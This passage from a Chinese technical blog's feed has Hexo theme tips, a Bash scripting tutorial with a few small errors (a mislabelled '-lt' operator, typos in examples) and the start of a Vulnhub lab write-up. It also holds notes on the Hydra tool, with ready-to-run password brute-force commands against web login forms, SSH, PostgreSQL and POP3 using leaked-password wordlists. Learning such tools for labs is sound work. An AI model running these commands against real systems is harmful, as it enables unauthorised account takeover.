<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">    <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">item_text_total:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">awl:</span> <span class="number">2</span>    <span class="comment">#多少字符统计为一个字</span></span><br><span class="line">    <span class="attr">wpm:</span> <span class="number">300</span>  <span class="comment">#阅读速度</span></span><br></pre></td></tr></table></figure>

<blockquote><p>Note for Chinese users: because in Chinese language average word length about ~1.5 and if you at most cases write posts in Chinese (without mixed English), recommended to set awl to 2 and wpm to 300.<br>But if you usualy mix your posts with English, awl to 4 and wpm to 275 will be nice.</p>
<footer><strong>hexo-symbols-count-time</strong><cite><a href="https://github.com/theme-next/hexo-symbols-count-time" target="_blank" rel="noopener">github.com/theme-next/hexo-symbols-count-time</a></cite></footer></blockquote>

<p>官方文档提示:因为在中文中一个词语的平均长度在 1.5 字左右，所以一般建议设置为awl=2，wpm=300。</p>
<p>最后执行<code>hexo clean</code>否则会显示不正常.<img src="https://github.com/theme-next/hexo-symbols-count-time/issues/53" alt="The symbols count is undefined and reading time is NaN:aN"></p>
<h3 id="next主题添加版权声明"><a href="#next主题添加版权声明" class="headerlink" title="next主题添加版权声明"></a>next主题添加版权声明</h3><p>在主题配置文件<code>themes/next/_config.yml</code>中将<code>creative_commons</code>项的<code>post</code>项设为<code>true</code>，就能开启内置版权声明。</p>
<h3 id="让页脚的心’活’起来"><a href="#让页脚的心’活’起来" class="headerlink" title="让页脚的心’活’起来"></a>让页脚的心’活’起来</h3><p>修改主题配置文件<code>themes/next/_config.yml</code>,搜索<code>footer</code>相关配置项</p>
<p>将<code>animated:false</code>处改为<code>true</code>即可</p>
<h3 id="将页脚的Tag-去掉"><a href="#将页脚的Tag-去掉" class="headerlink" title="将页脚的Tag#去掉"></a>将页脚的Tag<code>#</code>去掉</h3><p>在主题配置文件<code>themes/next/_config.yml</code>中将<code>tag_icon=false</code>改为<code>true</code>即可</p>
<h3 id="自定义域名后，需要每次去github-page-的setting中修改自定义域名"><a href="#自定义域名后，需要每次去github-page-的setting中修改自定义域名" class="headerlink" title="自定义域名后，需要每次去github page 的setting中修改自定义域名"></a>自定义域名后，需要每次去github page 的setting中修改自定义域名</h3><p>原因: source/文件夹下没有CNAME。</p>
<p>解决办法: source 文件夹下新建CNAME文件，内容为自定义域名即可</p>
]]></content>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra</title>
    <url>/2020/05/10/hydra%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。 </p>
<p>Hydra 可以爆破以下协议<br>    Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p>
<a id="more"></a>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S hydra</span><br></pre></td></tr></table></figure>

<h1 id="部分参数"><a href="#部分参数" class="headerlink" title="部分参数"></a>部分参数</h1><p>-l 设置用户名<br>-L 设置用户名字典<br>-p 设置密码<br>-P 设置密码字典<br>-s 设置端口<br>-t 设置线程<br>-V 输出详细内容</p>
<h1 id="web-get-登录"><a href="#web-get-登录" class="headerlink" title="web get 登录"></a>web get 登录</h1><p>hydra -l 设置用户名 -P 字典 -s 端口 ip地址 协议 “登录页面” -t 设置的线程数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l username -P wordlists -s 80 127.0.0.1 http-get &quot;&#x2F;login&quot; -t 64</span><br></pre></td></tr></table></figure>
<h1 id="web-post登录"><a href="#web-post登录" class="headerlink" title="web post登录"></a>web post登录</h1><p>例如 破解一个web表单登录</p>
<p>正常页面:<img src="https://images.atsud0.me/images/post/Screenshot_20200510_134305.jpg" alt="a"></p>
<p>白话版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l 设置用户名 -P 字典 -s 端口 ip地址 协议 &quot;登录页面:传过去的值使用^USER^和^PASS^代替:错误状态&quot; -t 设置的线程数</span><br></pre></td></tr></table></figure>

<p>这一段的值,我们可以使用burpsuite配合使用,<br>“/login:username=^USER^&amp;password=^PASS^”</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200510_132157.jpg" alt="burp"></p>
<p>转发后观察页面返回的值</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200510_132257.jpg" alt="get"></p>
<p>最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l molly -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -s 80 10.10.226.44 http-post-form &quot;&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Your username or password is incorrect.&quot; -t 64</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200510_134954.jpg" alt="fin"></p>
<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>ssh就更简单了</p>
<p>白话版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l 设置用户名 -P 字典 -s 端口 ip地址 协议 -t 设置的线程数</span><br></pre></td></tr></table></figure>

<p>完整版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l molly -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -s 22 10.10.226.44 ssh</span><br></pre></td></tr></table></figure>

<p>ssh的爆破也可以写成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l molly -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  ssh:&#x2F;&#x2F;10.10.226.44:22</span><br></pre></td></tr></table></figure>
<p>ftp等其他的方式也和ssh也差不多</p>
<h1 id="爆破postgresql"><a href="#爆破postgresql" class="headerlink" title="爆破postgresql"></a>爆破postgresql</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l postgres -P ~&#x2F;tools&#x2F;SecLists&#x2F;Passwords&#x2F;xato-net-10-million-passwords.txt -s 5432 127.0.0.1 postgres -vvv</span><br></pre></td></tr></table></figure>



<h1 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l boris -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -s [PORT] [IP] pop3</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-shell</title>
    <url>/2020/04/16/linux-shell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li><a href="https://www.runoob.com/linux/linux-shell.html" target="_blank" rel="noopener">菜鸟教程 Shell</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2020/04/bash-tutorial.html" target="_blank" rel="noopener">WangdocBash教程</a></li>
<li><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" title="" target="">命令行的艺术</a>

</li>
</ul>
<a id="more"></a>

<blockquote>
<p>shell是一个应用程序，它连接了用户和内核。使用户可以更高效，安全的使用内核。这就是linux命令行的本质。</p>
</blockquote>
<blockquote>
<p>shell也是一个命令解释器，也被称为shell编程。</p>
</blockquote>
<p>shell——应用程序</p>
<p>shell script=shell script脚本</p>
<p><code>#!/bin/bash</code><br>shell脚本的标识符，如果你要使用其他的<code>shell</code>程序来运行就修改它。<br>例如我要用<code>/usr/bin/zsh</code>来运行这个脚本，那我就使用<code>#!/usr/bin/zsh</code>作为开头</p>
<p>确认自己使用的shell是什么版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure>

<p>确认shell的版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SHELL --version</span><br><span class="line">zsh --version</span><br><span class="line">bash --version</span><br></pre></td></tr></table></figure>

<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="shell脚本执行方式"><a href="#shell脚本执行方式" class="headerlink" title="shell脚本执行方式"></a>shell脚本执行方式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.第一种</span><br><span class="line">chmod +x 1.sh</span><br><span class="line">.&#x2F;1.sh</span><br><span class="line"></span><br><span class="line">2.第二种</span><br><span class="line">&#x2F;bin&#x2F;bash 1.sh</span><br></pre></td></tr></table></figure>


<p>建议在主目录新建一个<del>/bin子目录，专门存放可执行脚本，然后把</del>/bin加入$PATH。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:~&#x2F;bin</span><br></pre></td></tr></table></figure>

<p>上面命令改变环境变量$PATH，将<del>/bin添加到$PATH的末尾。可以将这一行加到</del>/.bashrc文件里面，然后重新加载一次.bashrc，这个配置就可以生效了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>以后不管在什么目录，直接输入脚本文件名，脚本就会执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ script.sh</span><br></pre></td></tr></table></figure>
<p>上面命令没有指定脚本路径，因为script.sh在$PATH指定的目录中。</p>
<p>文件后缀名不影响使用。</p>
<h4 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h4><p>定义变量不加$符号</p>
<p>shell变量命名格式:</p>
<ul>
<li>变量名和等号之间不能有空格</li>
<li>命名不能用数字开头，中间不能有空格</li>
<li>不能使用标点符号，关键字</li>
</ul>
<h4 id="分号；"><a href="#分号；" class="headerlink" title="分号；"></a>分号；</h4><p>语句结束符，上一条命令执行结束后（不管成功与否，都会执行第二条命令</p>
<h4 id="变量使用"><a href="#变量使用" class="headerlink" title="变量使用"></a>变量使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;hello</span><br><span class="line">echo $&#123;a&#125;</span><br></pre></td></tr></table></figure>
<p>变量名外的花括号是可选的，建议加上，避免某些变量名被识别成字符串。</p>
<h4 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h4><p>使用readonly使变量变为只读。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;hello</span><br><span class="line">readonly a</span><br></pre></td></tr></table></figure>
<p>只读后将不能修改变量的值。</p>
<h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><p><code>unset a</code><br>unset不能删除只读变量. </p>
<h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><p>1.局部变量</p>
<blockquote>
<p>仅当前shell有效，重启后失效</p>
</blockquote>
<p>2.环境变量</p>
<blockquote>
<p>所有程序都能用环境变量</p>
</blockquote>
<p>3.shell变量</p>
<blockquote>
<p>shell程序设置的特殊变量</p>
</blockquote>
<h4 id="shell字符串"><a href="#shell字符串" class="headerlink" title="shell字符串"></a>shell字符串</h4><h5 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h5><p>a=’hello’</p>
<blockquote>
<p>字符串可以用单引号，也可以用双引号，也可以不用引号。<br>单引号字符串的变量无效，双引号可以。<br>单引号字符串成对出现，作为字符串拼接使用。</p>
</blockquote>
<h5 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h5><blockquote>
<p>双引号可以有变量，也可以出现转义字符。</p>
</blockquote>
<h5 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h5><p>获取字符串长度<br>$(#string)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&#39;zxcv&#39;</span><br><span class="line">echo $&#123;#a&#125;</span><br></pre></td></tr></table></figure>
<p>截取字符串<br><code>${string:2:4}</code></p>
<p><code>${string%.*}</code> 取得文件名</p>
<p><code>${string#*.}</code> 取得文件的后缀名</p>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p><code>#</code>这就是注释。</p>
<h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><p><code>$0</code> 脚本的文件名<br><code>$1</code> 第一个参数<br><code>$2</code> 第二个<br><code>$3</code> 第三个</p>
<h5 id="其他的特殊字符"><a href="#其他的特殊字符" class="headerlink" title="其他的特殊字符"></a>其他的特殊字符</h5><p><code>$#</code>传递到脚本的参数的个数<br><code>$*</code>以整体输出所有参数<br><code>$@</code>单独输出每个参数<br><code>$?</code>函数的返回值</p>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组下标从0开始,shell不支持多维数组。<br>shell数组用括号标识，元素用空格分割。</p>
<p>定义一个数组<br><code>a=(&#39;a&#39; &#39;b&#39; &#39;c&#39; &#39;d&#39;)</code></p>
<h5 id="使用数组"><a href="#使用数组" class="headerlink" title="使用数组"></a>使用数组</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;(&#39;a&#39; &#39;b&#39; &#39;c&#39; &#39;d&#39;)</span><br><span class="line">echo $&#123;a[1]&#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;#array[#*]&#125; #输出数组长度</span><br><span class="line">$&#123;array[@]&#125; #一次性输出数组内容</span><br><span class="line">$&#123;array[*]&#125; #一次性输出数组内容</span><br></pre></td></tr></table></figure>

<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>\*</td>
<td>乘法</td>
<td><code>expr $a \* $b</code></td>
</tr>
<tr>
<td>%</td>
<td>取余</td>
<td><code>expr $a % $b</code></td>
</tr>
<tr>
<td>=</td>
<td>赋值</td>
<td>a=$b</td>
</tr>
<tr>
<td>==</td>
<td>等于</td>
<td>[ $a == $b ] 条件判断 返回False</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
<td>[ $a != $b ] 条件判断 返回True</td>
</tr>
</tbody></table>
<p>乘法需要转义 <code>\*</code><br>shell中计算要用反引号``<br>为什么?</p>
<h5 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h5><table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-eq</td>
<td>检测两个数是否相等</td>
</tr>
<tr>
<td>-ne</td>
<td>检测两个数是否不相等</td>
</tr>
<tr>
<td>-gt</td>
<td>检测左边的数是否大于右边的，如果是，则返回 true。</td>
</tr>
<tr>
<td>-lt</td>
<td>等于</td>
</tr>
<tr>
<td></td>
<td>不等于</td>
</tr>
</tbody></table>
<h5 id="布尔运算"><a href="#布尔运算" class="headerlink" title="布尔运算"></a>布尔运算</h5><table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>或运算，又一个表达式为true就返回true</td>
</tr>
<tr>
<td>-a</td>
<td>与运算，两个表达式为true才返回true</td>
</tr>
<tr>
<td>!</td>
<td>非运算，表达式为true返回false，否则返回true.</td>
</tr>
</tbody></table>
<h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h5><table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;&amp;</td>
<td>逻辑AND</td>
</tr>
<tr>
<td>||</td>
<td>逻辑OR</td>
</tr>
</tbody></table>
<h5 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h5><table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>检测目录</td>
</tr>
<tr>
<td>-f</td>
<td>检测是不是文件</td>
</tr>
<tr>
<td>-r -w -x</td>
<td>检测文件权限</td>
</tr>
<tr>
<td>-g -u</td>
<td>检测SGID/SUID位</td>
</tr>
</tbody></table>
<h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p><code>(())</code>可以进行<strong>整数</strong>的算术运算，并且自动忽略内部的空格<br>((…))语法支持的算术运算符如下。</p>
<ul>
<li>+：加法</li>
<li>-：减法</li>
<li>*：乘法</li>
<li>/：除法（整除）</li>
<li>%：余数</li>
<li>**：指数</li>
<li>++：自增运算（前缀或后缀）</li>
<li>–：自减运算（前缀或后缀）</li>
</ul>
<p>i++ 和 ++i 的区别<br>i++是先使用变量i，然后再自增<br>++i是先让i自增，再使用变量i</p>
<p>((…))结构可以嵌套，也可以在内部用圆括号改变运算顺序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo $(((5**2) * 3))</span><br><span class="line">75</span><br><span class="line"># 等同于</span><br><span class="line">$ echo $(($((5**2)) * 3))</span><br><span class="line">75</span><br></pre></td></tr></table></figure>


<h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><h5 id="原样输出"><a href="#原样输出" class="headerlink" title="原样输出"></a>原样输出</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<h5 id="输出多行文本"><a href="#输出多行文本" class="headerlink" title="输出多行文本"></a>输出多行文本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;asdasd</span><br><span class="line">asdasd</span><br><span class="line">asdasdad</span><br><span class="line">asdasdasd</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>


<h5 id="echo-n"><a href="#echo-n" class="headerlink" title="echo -n"></a>echo -n</h5><p>echo默认换行，使用-n参数可以取消换行</p>
<h5 id="开启转义-e"><a href="#开启转义-e" class="headerlink" title="开启转义 -e"></a>开启转义 -e</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;OK!\n&quot; # -e 开启转义</span><br></pre></td></tr></table></figure>

<h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p><code>read</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">read name</span><br><span class="line">echo &quot;hello $name&quot;</span><br></pre></td></tr></table></figure>
<p><code>read</code> 的参数</p>
<ul>
<li>-t 超时秒数,如果超过了和指定时间，用户仍然没有输入，脚本将继续向下执行。</li>
<li>-p 指定用户输入时的提示信息</li>
<li>-a 将用户输入的值赋值给一个数组</li>
<li>-n 指定值读取若干个字符作为变量值，而不是整行读取</li>
<li>-e 允许用户输入时，使用readline提供的快捷键</li>
</ul>
<h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><p>当参数大于前面的规则时，还是会按照前面的输出<br>printf输出默认不换行</p>
<p>换行需要用<code>\n</code></p>
<p>格式化</p>
<p>%s字符串 %-10s左对齐，没有就右对齐<br>%f浮点数 %9.2f .2是小数部分<br>%d整数</p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-eq</td>
<td>等于</td>
</tr>
<tr>
<td>-ne</td>
<td>不等于</td>
</tr>
<tr>
<td>-gt</td>
<td>大于</td>
</tr>
<tr>
<td>-ge</td>
<td>大于等于</td>
</tr>
<tr>
<td>-lt</td>
<td>小于</td>
</tr>
<tr>
<td>-le</td>
<td>小于等于</td>
</tr>
</tbody></table>
<h5 id="test字符串测试"><a href="#test字符串测试" class="headerlink" title="test字符串测试"></a>test字符串测试</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test 表达式</span><br><span class="line"></span><br><span class="line">[ 表达式 ]</span><br><span class="line"></span><br><span class="line">[[ 表达式 ]]</span><br></pre></td></tr></table></figure>

<p>第三种支持正则表达式。<br>使用第二种<code>[]</code>和第三种<code>[[]]</code>在表达式的前后都要有空格</p>
<blockquote>
<p>其实[也是一个特殊命令，用<code>type -a [</code>可以看到有个<code>[ is &#39;/bin/[&#39;</code>，这也解释了为什么[后面要有空格。</p>
</blockquote>
<h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>if的else语句不能为空，如果没有执行条件就不要写.</p>
<h5 id="if-1"><a href="#if-1" class="headerlink" title="if"></a>if</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line">if [ $a -eq $b ];</span><br><span class="line">then</span><br><span class="line">    echo &quot;相等&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h5 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line">if [ $a -eq $b ];</span><br><span class="line">then</span><br><span class="line">    echo &quot;相等&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;不相登&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h5 id="if-else-if-else"><a href="#if-else-if-else" class="headerlink" title="if else-if else"></a>if else-if else</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line"></span><br><span class="line">if [ $a -eq $b]</span><br><span class="line">then</span><br><span class="line">    echo &quot;相等&quot;</span><br><span class="line">elif [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">    echo &quot;大于&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;？？？&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><p>格式1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for var in &quot;item1 item2 itmeN&quot;</span><br><span class="line">do</span><br><span class="line">    echo &quot;$var&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>格式2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ((i&#x3D;1;i&lt;&#x3D;5;i++))</span><br><span class="line">do</span><br><span class="line">    echo &quot;$i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>for的无限循环<br><code>for (( ;; ))</code></p>
<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>两种无限循环</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    echo &quot;a&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while:</span><br><span class="line">do</span><br><span class="line">    echo &quot;a&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="until循环"><a href="#until循环" class="headerlink" title="until循环"></a>until循环</h4><p>until条件为false时才执行，当条件为true不执行。</p>
<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case var in</span><br><span class="line">1)</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">    echo &quot;ss&quot;</span><br><span class="line">    ;;</span><br><span class="line">2)</span><br><span class="line">    echo &quot;ss&quot;</span><br><span class="line">    echo &quot;aa&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo &quot;??&quot;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h4 id="break-跳出循环"><a href="#break-跳出循环" class="headerlink" title="break 跳出循环"></a>break 跳出循环</h4><p>break跳出所有循环</p>
<h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>跳出当前循环</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function name()&#123;</span><br><span class="line">    command #语句</span><br><span class="line">    [return value] #返回值，可指定返回值，也可以不写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$?</code>调用函数的返回值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function c()&#123;</span><br><span class="line">    echo &#39;aaa&#39;</span><br><span class="line">    b&#x3D;&quot;123&quot;</span><br><span class="line">    retun $b</span><br><span class="line">&#125;</span><br><span class="line">c</span><br><span class="line">echo $?</span><br></pre></td></tr></table></figure>


<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>~</td>
<td>家目录</td>
</tr>
<tr>
<td>~+</td>
<td>当前所在目录</td>
</tr>
<tr>
<td>?</td>
<td>匹配文件路径里面的任意单字符，但不匹配空字符,如果需要匹配多个任意单个字符，可以用多个?</td>
</tr>
<tr>
<td>*</td>
<td>匹配文件路径里的任意数量字符，包括0个字符</td>
</tr>
<tr>
<td>**</td>
<td>和*一样，但是区别在于**是用于匹配零个或多个子目录</td>
</tr>
<tr>
<td>[]</td>
<td>匹配括号内的任意一个字符，方括号是文件名匹配，开展后的结果必须符合现有文件的路径，如果不存在，就不进行扩展。</td>
</tr>
<tr>
<td>[start-end]</td>
<td>匹配一个范围.</td>
</tr>
<tr>
<td>{1,2,3}</td>
<td>分别扩展大括号里面的值，大括号内部不能有空格。大括号可以嵌套。{p{n,h}{p,g}},也可以于其他字符连用。</td>
</tr>
<tr>
<td>{start..end}</td>
<td>连续序列，范围。touch {1..99}.txt，也可以{99..1}</td>
</tr>
<tr>
<td>$变量</td>
<td></td>
</tr>
<tr>
<td>$()</td>
<td>子命令扩展</td>
</tr>
<tr>
<td>``</td>
<td>同上</td>
</tr>
<tr>
<td>(())</td>
<td>算术扩展</td>
</tr>
<tr>
<td>[[:class:]]</td>
<td>表示某一类特定字符</td>
</tr>
</tbody></table>
<h4 id="start-end扩展的常用例子"><a href="#start-end扩展的常用例子" class="headerlink" title="start-end扩展的常用例子"></a>start-end扩展的常用例子</h4><ul>
<li>[a-z]：所有小写字母。</li>
<li>[a-zA-Z]：所有小写字母与大写字母。</li>
<li>[a-zA-Z0-9]：所有小写字母、大写字母与数字。</li>
<li>[abc]*：所有以a、b、c字符之一开头的文件名。</li>
<li>program.[co]：文件program.c与文件program.o。</li>
<li>BACKUP.[0-9][0-9][0-9]：所有以BACKUP.开头，后面是三个数字的文件名</li>
</ul>
<h4 id="常用-class-字符类"><a href="#常用-class-字符类" class="headerlink" title="常用[[:class:]]字符类"></a>常用[[:class:]]字符类</h4><ul>
<li>[[:alnum:]]：匹配任意英文字母与数字</li>
<li>[[:alpha:]]：匹配任意英文字母</li>
<li>[[:blank:]]：空格和 Tab 键。</li>
<li>[[:cntrl:]]：ASCII 码 0-31 的不可打印字符。</li>
<li>[[:digit:]]：匹配任意数字 0-9。</li>
<li>[[:graph:]]：A-Z、a-z、0-9 和标点符号。</li>
<li>[[:lower:]]：匹配任意小写字母 a-z。</li>
<li>[[:print:]]：ASCII 码 32-127 的可打印字符。</li>
<li>[[:punct:]]：标点符号（除了 A-Z、a-z、0-9 的可打印字符）。</li>
<li>[[:space:]]：空格、Tab、LF（10）、VT（11）、FF（12）、CR（13）。</li>
<li>[[:upper:]]：匹配任意大写字母 A-Z。</li>
<li>[[:xdigit:]]：16进制字符（A-F、a-f、0-9）</li>
</ul>
<p>有一种内网提权方式叫做通配符注入。了解部分通配符还是很有必要的。</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-pWnOS2.0</title>
    <url>/2020/07/11/Vulnhub-pWnOS2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>一个简单的靶机~</p>
<p><a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>

